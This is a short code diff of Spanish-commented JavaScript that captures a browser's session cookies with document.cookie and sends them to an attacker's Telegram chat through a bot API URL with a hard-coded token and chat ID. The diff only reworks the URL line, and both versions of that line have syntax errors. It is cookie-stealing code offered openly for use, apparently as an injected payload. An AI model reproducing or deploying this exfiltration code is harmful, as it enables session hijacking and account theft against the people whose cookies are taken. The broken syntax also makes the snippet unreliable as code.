@@ -3,7 +3,7 @@
     var token = "7825739165:AAFACaoOmHMVD5aqtdFZ7Q2AEuASlpaKgdk"; // Tu Token de Telegram
     var chat_id = "2062208754"; // Tu Chat ID de Telegram
     var cookie = document.cookie; // Captura las cookies de sesión
-    var url = "https://api.telegram.org/bot" +7825739165:AAFACaoOmHMVD5aqtdFZ7Q2AEuASlpaKgdk+ "/sendMessage?chat_id=" + 2062208754 + "&text=🔴%20Cookie:%20" + encodeURIComponent(cookie);
+    var url = "https://api.telegram.org/bot7825739165:AAFACaoOmHMVD5aqtdFZ7Q2AEuASlpaKgdk/sendMessage?chat_id="2062208754"&text=🔴%20Cookie:%20" + encodeURIComponent(cookie);
 
     fetch(url) // Envía las cookies a tu Telegram
       .then(response => console.log("Cookie enviada"))
